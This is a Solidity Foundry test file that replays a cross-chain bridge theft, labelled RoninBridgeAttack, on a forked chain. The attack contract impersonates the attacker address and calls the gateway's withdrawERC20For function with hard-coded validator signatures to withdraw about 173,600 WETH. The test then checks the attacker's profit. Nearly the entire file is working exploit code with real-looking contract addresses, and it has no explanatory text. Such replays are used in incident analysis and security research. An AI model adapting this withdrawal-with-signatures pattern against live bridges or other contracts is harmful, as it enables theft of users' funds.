
pragma solidity ^0.8.20;

import "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 14442834;
    uint256 constant TX_TIMESTAMP = 1648042149;
    uint256 constant TX_BLOCK_NUMBER = 14442835;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        RoninBridgeAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (RoninBridgeAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _installAttackCode();
            attack = RoninBridgeAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new RoninBridgeAttack();
        }
    }

    function _prepareProfit(RoninBridgeAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _installAttackCode() internal {
        vm.etch(ATTACK_CONTRACT, type(RoninBridgeAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.ZERO, "ETH", 173599980101000000000000);
    }
}

contract RoninBridgeAttack {
    uint256 private constant WITHDRAWAL_CHAIN_ID = 2000000;
    uint256 private constant WETH_WITHDRAW_AMOUNT = 173600000000000000000000;

    function attack() external payable {
        _withdrawViaGateway(
            WITHDRAWAL_CHAIN_ID,
            Addresses.attacker_eoa,
            Addresses.WETH,
            WETH_WITHDRAW_AMOUNT,
            _validatorSignatures()
        );
    }

    function withdrawERC20For(
        uint256 chainId,
        address recipient,
        address token,
        uint256 withdrawAmount,
        bytes calldata validatorSignatures
    ) external payable {
        _withdrawViaGateway(chainId, recipient, token, withdrawAmount, validatorSignatures);
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    receive() external payable {
        _acceptWethPayout();
    }

    fallback() external payable {
        _acceptWethPayout();
    }

    function _withdrawViaGateway(
        uint256 chainId,
        address recipient,
        address token,
        uint256 withdrawAmount,
        bytes memory validatorSignatures
    ) internal {
        bytes memory gatewayCall = abi.encodeCall(
            IMainchainGatewayManager.withdrawERC20For, (chainId, recipient, token, withdrawAmount, validatorSignatures)
        );
        (bool ok,) = Addresses.MainchainGatewayManager.delegatecall(gatewayCall);
        require(ok, "gateway withdraw failed");
    }

    function _acceptWethPayout() internal {
        (bool ok,) = Addresses.MainchainGatewayManager.delegatecall("");
        require(ok, "gateway callback failed");
    }

    function _validatorSignatures() internal pure returns (bytes memory) {
        return hex"01175db2b62ed80a0973b4ea3581b22629026e3c6767125f14a98dc30194a533744ba284b5855cfbc34c1416e7106bd1d4ce84f13ce816370645aad66c0fcae4771b010984ea09911beeadcd3dab46621bc81071ba91ce24d5b7873bc6a34e34c6aafa563916059051649b3c1930425aa3a79a293cacf24a21bda3b2a46a1e3d39a6551c01f962ee0e333c2f7261b3077bb7b7544001d555df4bc2e6a5cae2b2dac3d1fe3875cd1d12fadbeb4c01f01e196aa36e395a94de074652971c646b4b3b7149b3121b0178bd67c4fa659087c5f7696d912dee9db37802a3393bf4bd799e22eb201e78d90dc3f57e99d8916cd0282face42324f3afa0d96b0a09c4f914f15cac9c11037b1b0102b7a3a587c5be368f324893ed06df7bdcd3817b1880bd6dada86df15bd50d275fc694a8914d1818a2d432f980a97892f303d5a893a3eec176f46957958ecb991c";
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant attacker_eoa = 0x098B716B8Aaf21512996dC57EB0615e2383E2f96;
    address internal constant attack_contract = 0x1A2a1c938CE3eC39b6D47113c7955bAa9DD454F2;
    address internal constant MainchainGatewayManager = 0x8407dc57739bCDA7aA53Ca6F12F82F9d51c2F21E;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
}

interface IMainchainGatewayManager {
    function withdrawERC20For(uint256 chainId, address recipient, address token, uint256 amount, bytes calldata proof)
        external;
}
